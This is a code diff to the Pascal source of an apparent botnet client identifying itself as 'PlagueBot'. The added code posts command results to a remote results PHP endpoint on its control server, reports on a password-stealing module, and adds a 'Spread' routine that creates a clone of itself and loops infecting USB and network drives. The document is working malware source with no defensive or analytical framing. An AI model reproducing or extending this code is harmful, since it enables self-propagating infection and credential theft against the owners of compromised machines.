@@ -163,19 +163,23 @@ var
   STemp, STemp2: String;
 
   procedure DoPost;
+  var Q: String;
   Begin
+    ToPost.AddFormField('GUID', ID);
+    ToPost.AddFormField('ID', FCmdID);
+    Q:='';
     try
-     Writeln('[',FIndex,'] CMD-POST --> ',Hat.Post(Server+ResultsPHP, ToPost));
+     Q:=Hat.Post(Server+ResultsPHP, ToPost);
     except
     end;
+    Writeln('[',FIndex,'] CMD-POST --> ',Q);
+    ToPost.Clear;
   end;
 
 Begin
   Hat.Request.Connection:='keep-alive';
   Hat.Request.UserAgent:='PlagueBot';
   ToPost:=TIdMultipartFormDataStream.Create;
-  ToPost.AddFormField('GUID', ID);
-  ToPost.AddFormField('ID', FCmdID);
   Case Net.Commands.ReadString(FCmdID, 'Type', '') of
     'Register': Begin
       ToPost.AddFormField('RT', '3');
@@ -402,20 +406,30 @@ Begin
         ToPost.AddFormField('Result', 'Failed to execute the password module.');
       end;
       DoPost;
-      Sleep(500);
-      if FileExists('P.html') then DeleteFile('P.html');
+      Sleep(700);
+      ChDel('P.html');
     end;
     'Spread': Begin
       ToPost.AddFormField('RT', '1');
-      ToPost.AddFormField('Result', 'Spreading routine started.');
-      DoPost;
       //Create clone
-      While Not(Terminated) do Begin
-        InfectUSBDrives;
-        InfectNetworkDrives;
-        Sleep(1000);
+      if CreateClone('Clone.tmp') then Begin
+        ToPost.AddFormField('Result', 'Spreading routine started.');
+        ToPost.AddFormField('Continue', 'True');
+        DoPost;
+        While Not(Terminated) do Begin
+          InfectUSBDrives;
+          InfectNetworkDrives;
+          Sleep(1000);
+        end;
+        //Remove clone
+        ChDel('Clone.tmp');
+        ToPost.AddFormField('RT', '1');
+        ToPost.AddFormField('Result', 'Spreading routine ended.');
+        DoPost;
+      end else Begin
+        ToPost.AddFormField('Result', 'Failed to create a clone.');
+        DoPost;
       end;
-      //Remove clone
     end
     else Begin
       ToPost.AddFormField('RT', '1');
